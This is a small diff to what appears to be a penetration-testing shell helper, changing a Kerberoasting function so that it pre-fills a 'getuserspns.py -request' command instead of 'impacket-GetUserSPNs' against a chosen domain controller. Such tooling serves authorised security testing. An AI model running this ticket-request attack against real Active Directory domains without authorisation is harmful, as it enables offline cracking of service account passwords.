@@ -53,5 +53,5 @@ nb-enum-kerb-kerberoast() {
     __check-user
     __ask "Enter the IP address of the target domain controller"
     nb-vars-set-rhost
-    print -z "impacket-GetUserSPNs -request ${__DOMAIN}s/${__USER} -dc-ip ${__RHOST} "
+    print -z "getuserspns.py -request ${__DOMAIN}s/${__USER} -dc-ip ${__RHOST} "
 }
